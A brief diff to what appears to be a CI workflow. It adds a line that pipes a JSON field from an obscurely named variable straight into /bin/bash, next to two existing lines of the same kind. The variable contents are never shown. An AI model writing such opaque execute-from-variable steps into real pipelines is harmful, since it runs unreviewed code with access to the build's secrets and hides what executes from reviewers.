@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$agze808" | jq -r .mtpy3 | /bin/bash
           printf '%s' "$ic6" | jq -r .azpn6 | /bin/bash
+          echo $a153 | jq -r .s448 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
